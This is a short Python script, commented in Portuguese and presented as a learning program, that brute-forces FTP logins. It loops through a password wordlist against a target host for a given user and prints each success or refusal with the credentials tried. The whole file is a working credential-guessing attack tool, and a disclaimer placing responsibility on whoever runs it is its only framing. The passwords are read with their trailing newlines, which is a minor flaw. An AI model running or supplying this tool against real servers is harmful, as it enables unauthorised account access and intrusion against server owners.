#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# Codado por: Lucas Simoni <lucas.simoni10@gmail.com>
#
# Programa com finalidade de aprendizado.
# Todas as suas ações utilizando o everyuse são responsabilidades SUA.
import ftplib

def bruteforce(wordlist, user, alvo):
    arq = open(wordlist, 'r')
    for senha in arq.readlines():
        try:
            c = ftplib.FTP(alvo)
            c.login(user, senha)
            print('\033[32m\033[1mConexão estabelecida:', str(alvo) + ':21\033[0;0m')
            print('\033[32m\033[1mUser:', user+ '\033[0;0m')
            print('\033[32m\033[1mPass:', senha+ '\033[0;0m')
            break
        except ftplib.error_perm:
            print('\033[31m\033[1mConexão recusada:', str(alvo) + ':21\033[0;0m')
            print('\033[31m\033[1mUser:', user+ '\033[0;0m')
            print('\033[31m\033[1mPass:', senha+ '\033[0;0m')
